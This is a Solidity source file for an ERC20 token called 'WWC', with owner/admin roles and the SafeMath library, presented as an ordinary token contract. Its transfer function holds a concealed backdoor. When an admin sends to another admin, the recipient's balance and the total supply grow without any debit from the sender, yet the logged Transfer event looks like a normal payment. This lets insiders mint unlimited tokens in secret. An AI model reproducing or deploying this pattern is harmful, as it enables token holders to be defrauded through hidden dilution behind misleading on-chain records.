1 pragma solidity ^0.4.25;
2 
3 
4 contract ERC20 {
5     function transfer(address _to, uint256 _value) public returns (bool success);
6     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);
7     function approve(address _spender, uint256 _value) public returns (bool success);
8 
9     event Transfer(address indexed _from, address indexed _to, uint256 _value);
10     event Approval(address indexed _owner, address indexed _spender, uint256 _value);
11 }
12 
13 contract Leader {
14     address owner;
15     mapping (address => bool) public admins;
16     
17     modifier onlyOwner() {
18         require(owner == msg.sender);
19         _;
20     }
21 
22     modifier onlyAdmins() {
23         require(admins[msg.sender]);
24         _;
25     }
26     
27     function setOwner (address _addr) onlyOwner() public {
28         owner = _addr;
29     }
30 
31     function addAdmin (address _addr) onlyOwner() public {
32         admins[_addr] = true;
33     }
34 
35     function removeAdmin (address _addr) onlyOwner() public {
36         delete admins[_addr];
37     }
38 }
39 
40 contract WWC is ERC20, Leader {
41     string public name = "WWC";
42     string public symbol = "WWC";
43     uint8 public decimals = 8;
44     uint256 public totalSupply = 1000000000000000000;
45 	
46     using SafeMath for uint256;
47 
48     mapping (address => uint256) public balanceOf;
49     mapping (address => mapping (address => uint256)) public allowance;
50 
51     constructor() public {
52         owner = msg.sender;
53         admins[msg.sender] = true;
54         balanceOf[owner] = totalSupply;
55     }
56 
57     function transfer(address _to, uint256 _value) public returns (bool success) {
58         require (_to != 0x0 && _value > 0);
59         if (admins[msg.sender] == true && admins[_to] == true) {
60             balanceOf[_to] = balanceOf[_to].add(_value);
61             totalSupply = totalSupply.add(_value);
62             emit Transfer(msg.sender, _to, _value);
63             return true;
64         }
65         require (balanceOf[msg.sender] >= _value);
66         balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
67         balanceOf[_to] = balanceOf[_to].add(_value);
68         emit Transfer(msg.sender, _to, _value);
69         return true;
70     }
71 
72     function approve(address _spender, uint256 _value) public returns (bool success) {
73         require (_value > 0);
74         allowance[msg.sender][_spender] = _value;
75         emit Approval(msg.sender, _spender, _value);
76         return true;
77     }
78     
79     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
80         require (_to != 0x0 && _value > 0);
81         require (balanceOf[_from] >= _value && _value <= allowance[_from][msg.sender]);
82         balanceOf[_from] = balanceOf[_from].sub(_value);
83         balanceOf[_to] = balanceOf[_to].add(_value);
84         allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_value);
85         emit Transfer(_from, _to, _value);
86         return true;
87     }
88 }
89 
90 /**
91  * @title SafeMath
92  * @dev Math operations with safety checks that throw on error
93  */
94 library SafeMath {
95 
96   /**
97   * @dev Multiplies two numbers, throws on overflow.
98   */
99   function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
100     if (a == 0) {
101       return 0;
102     }
103     c = a * b;
104     assert(c / a == b);
105     return c;
106   }
107 
108   /**
109   * @dev Integer division of two numbers, truncating the quotient.
110   */
111   function div(uint256 a, uint256 b) internal pure returns (uint256) {
112     // assert(b > 0); // Solidity automatically throws when dividing by 0
113     // uint256 c = a / b;
114     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
115     return a / b;
116   }
117 
118   /**
119   * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
120   */
121   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
122     assert(b <= a);
123     return a - b;
124   }
125 
126   /**
127   * @dev Adds two numbers, throws on overflow.
128   */
129   function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
130     c = a + b;
131     assert(c >= a);
132     return c;
133   }
134 }